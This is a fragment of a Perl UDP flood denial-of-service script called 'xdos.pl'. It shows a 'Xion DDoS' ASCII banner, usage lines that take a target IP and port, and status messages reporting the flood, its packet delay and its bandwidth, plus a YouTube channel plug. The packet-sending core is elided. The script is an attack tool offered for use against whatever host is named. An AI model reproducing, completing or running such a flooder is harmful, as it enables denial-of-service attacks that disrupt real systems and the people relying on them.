...
\ \/ (_) ___  _ __   |  _ \|  _ \  ___/ ___|
 \  /| |/ _ \| '_ \  | | | | | | |/ _ \___ \
 /  \| | (_) | | | | | |_| | |_| | (_) |__) |
/_/\_\_|\___/|_| |_| |____/|____/ \___/____/

 [!] Usage:
   >  perl xdos.pl [IP] [Port]
   > ./xdos.pl [IP] [Port]
...
print "[!] Flooding IP: $ip " . ($port ? $port : "By:") . " Xion " . 
  ($size ? "$size-byte" : "UDP Xion") . " www.youtube.com/channel/UCeJRwoAgsx6-29m624WNh-g" . ($time ? " for $time seconds" : "") . "\n";
print "[!] Interpacket delay $delay msec\n" if $delay;
print "[!] total IP bandwidth $bw kbps\n" if $bw;
print "[!] Para parar presiona Ctrl+C\n" unless $time;
